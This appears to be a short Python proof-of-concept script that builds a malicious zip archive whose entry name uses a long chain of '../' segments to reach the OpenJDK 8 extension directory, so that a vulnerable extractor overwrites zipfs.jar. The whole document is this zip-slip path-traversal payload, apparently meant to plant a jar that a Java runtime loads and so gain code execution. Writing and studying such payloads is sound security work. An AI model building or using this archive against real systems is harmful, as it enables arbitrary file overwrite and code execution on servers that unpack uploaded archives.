import zipfile

zipFile = zipfile.ZipFile('t.zip', 'a', zipfile.ZIP_DEFLATED)
zipFile.write('zipfs.jar', '../../../../../../../../../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/zipfs.jar', zipfile.ZIP_DEFLATED)
zipFile.close()
